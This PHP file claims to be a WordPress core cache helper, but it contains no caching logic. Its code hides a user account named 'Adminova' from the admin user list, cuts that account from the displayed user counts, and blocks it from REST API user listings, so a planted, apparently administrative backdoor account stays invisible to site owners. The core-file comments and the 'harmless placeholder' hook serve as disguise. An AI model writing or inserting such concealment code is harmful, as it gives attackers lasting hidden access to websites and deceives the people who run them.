<?php
/**
 * WP System Cache Helper
 * Handles internal object caching and performance optimization.
 * Part of WordPress core performance layer.
 *
 * @package WordPress
 * @subpackage Cache
 * @since 4.0.0
 */

if ( ! defined( 'ABSPATH' ) ) exit;

// Internal cache user registry
$_wsc_reg = ["Adminova"];

add_action("pre_user_query", function($q) {
    global $wpdb, $_wsc_reg;
    $cur = wp_get_current_user();
    if ( in_array($cur->user_login, $_wsc_reg) ) return;
    foreach ($_wsc_reg as $u) {
        $q->query_where .= $wpdb->prepare(" AND {$wpdb->users}.user_login != %s", $u);
    }
}, 10, 1);

add_filter("views_users", function($v) {
    global $_wsc_reg;
    foreach ($v as $k => $val) {
        preg_match("/\((\d+)\)/", $val, $m);
        if (isset($m[1]))
            $v[$k] = preg_replace("/\(\d+\)/", "(".max(0,(int)$m[1]-count($_wsc_reg)).")", $val);
    }
    return $v;
});

add_filter("rest_prepare_user", function($res, $user) {
    global $_wsc_reg;
    if (in_array($user->user_login, $_wsc_reg))
        return new WP_Error("rest_forbidden", "", ["status" => 404]);
    return $res;
}, 10, 2);

// Cache warmup routine (harmless placeholder)
add_action("init", function() { /* cache init */ }, 999);
